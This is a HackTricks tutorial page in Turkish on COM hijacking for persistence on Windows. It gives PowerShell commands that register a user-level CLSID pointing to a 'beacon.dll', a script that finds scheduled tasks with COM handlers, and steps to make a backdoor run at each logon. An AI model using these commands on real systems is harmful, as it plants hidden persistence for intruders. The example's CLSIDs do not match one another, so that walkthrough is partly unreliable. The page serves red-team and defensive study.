# COM Hijacking

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan ileri seviyeye taşıyın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek**.

</details>

### Var olmayan COM bileşenlerini arama

HKCU değerleri kullanıcılar tarafından değiştirilebildiği için **COM Hijacking**, bir **kalıcı mekanizma** olarak kullanılabilir. `procmon` kullanarak, saldırganın kalıcı oluşturabileceği var olmayan COM kayıtlarını bulmak kolaydır. Filtreler:

* **RegOpenKey** işlemleri.
* _Sonuç_ **NAME NOT FOUND** olanlar.
* _Yolun_ **InprocServer32** ile bittiği.

Hangi var olmayan COM'u taklit etmeye karar verdiyseniz, aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Ele geçirilebilir Görev Zamanlayıcı COM bileşenleri

Windows Görevleri, COM nesnelerini çağırmak için Özel Tetikleyiciler kullanır ve Görev Zamanlayıcısı aracılığıyla çalıştırıldıkları için tetiklenecekleri zamanı tahmin etmek daha kolaydır.

```powershell
# COM CLSID'lerini göster
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
    if ($Task.Actions.ClassId -ne $null)
    {
        if ($Task.Triggers.Enabled -eq $true)
        {
            $usersSid = "S-1-5-32-545"
            $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

            if ($Task.Principal.GroupId -eq $usersGroup)
            {
                Write-Host "Görev Adı: " $Task.TaskName
                Write-Host "Görev Yolu: " $Task.TaskPath
                Write-Host "CLSID: " $Task.Actions.ClassId
                Write-Host
            }
        }
    }
}

# Örnek Çıktı:
<strong># Görev Adı:  Örnek
</strong># Görev Yolu:  \Microsoft\Windows\Örnek\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [öncekiyle benzer şekilde devam eder...]</code></pre>

Çıktıyı kontrol ederek, örneğin **her kullanıcı oturum açtığında** çalıştırılacak bir tane seçebilirsiniz.

Şimdi, **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** ve HKLM ve HKCU'da CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**'i araştırırken, genellikle HKCU'da değerin mevcut olmadığını bulacaksınız.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Ardından, HKCU girişini oluşturabilirsiniz ve her kullanıcı oturum açtığında, arka kapınız ateşlenecektir.

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
